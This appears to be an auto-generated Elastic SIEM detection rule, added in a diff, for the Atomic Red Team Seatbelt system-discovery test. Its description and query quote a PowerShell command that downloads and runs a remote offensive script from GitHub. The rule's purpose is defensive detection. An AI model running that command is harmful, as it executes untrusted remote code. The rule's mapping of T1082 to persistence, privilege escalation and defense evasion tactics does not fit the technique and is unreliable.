@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'WinPwn - PowerSharpPack - Seatbelt' (GUID: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95) of technique T1082 (System Information Discovery). Test Description: PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \\\"safety checks\\\" relevant from both offensive and defensive security perspectives.. Command/Steps: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbel..."
+from = "now-9m"
+rule_id = "0db66a00-475f-44b3-b759-8eb6b061e59c"
+language = "kql"
+name = "Atomic Test: T1082 - WinPwn - PowerSharpPack - Seatbelt"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1082/T1082.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1082", "5c16ceb4-ba3a-43d7-b848-a13c1f216d95", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*iex(new-object*\\\" AND powershell.script_block_text : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')*\\\" AND powershell.script_block_text : \\\"*Invoke-Seatbelt*\\\" OR (process.command_line : \\\"*iex(new-object*\\\" AND process.command_line : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')*\\\" AND process.command_line : \\\"*Invoke-Seatbelt*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1082"
+name = "WinPwn - PowerSharpPack - Seatbelt"
+reference = "https://attack.mitre.org/techniques/T1082"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1082"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1082"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1082"
+
+
